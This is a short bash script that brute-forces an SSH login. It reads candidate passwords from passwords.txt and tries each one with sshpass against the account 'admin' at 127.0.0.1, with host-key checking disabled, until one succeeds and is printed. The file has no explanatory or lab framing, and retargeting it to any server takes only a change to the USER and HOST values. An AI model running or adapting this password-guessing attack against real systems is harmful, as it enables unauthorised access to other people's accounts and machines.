#!/bin/bash
USER="admin"
HOST="127.0.0.1"
for pass in $(cat passwords.txt); do
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 $USER@$HOST "echo success" && \
    echo "Password found: $pass" && break
done
